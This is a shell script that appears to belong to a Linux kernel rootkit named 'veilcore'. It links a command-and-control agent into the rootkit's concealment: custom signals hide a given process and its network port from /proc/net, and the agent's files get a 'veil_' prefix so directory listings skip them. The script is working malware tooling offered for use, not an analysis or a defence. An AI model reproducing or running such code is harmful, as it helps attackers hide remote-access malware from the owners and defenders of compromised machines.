#!/bin/sh
# integrate.sh - wire a C2 agent into the veilcore module's hiding layers.
#
# usage: integrate.sh <pid> <port> [agent-dir]
#   pid   process id of the running agent (hidden via kill -34)
#   port  agent's connect/listen port (hidden from /proc/net via kill -37)
#   dir   optional: directory holding the agent binaries - when given its
#         contents are re-prefixed with the magic veil_ prefix so getdents
#         never lists them
#
# The module must already be loaded (insmod veilcore.ko). All operations
# are idempotent.
set -u

PID="${1:-}"
PORT="${2:-}"
DIR="${3:-}"

[ -n "$PID" ] && kill -34 "$PID" && echo "process $PID hidden"
[ -n "$PORT" ] && kill -37 "$PORT" && echo "port $PORT hidden"

if [ -n "$DIR" ] && [ -d "$DIR" ]; then
    for f in "$DIR"/*; do
        base=$(basename "$f")
        case "$base" in
            veil_*) ;;                                    # already prefixed
            *) mv "$f" "$DIR/veil_$base" && echo "renamed $base -> veil_$base" ;;
        esac
    done
fi

echo "note: start the agent from the veil_-prefixed path from now on;"
echo "      update its launcher/ko_path accordingly."
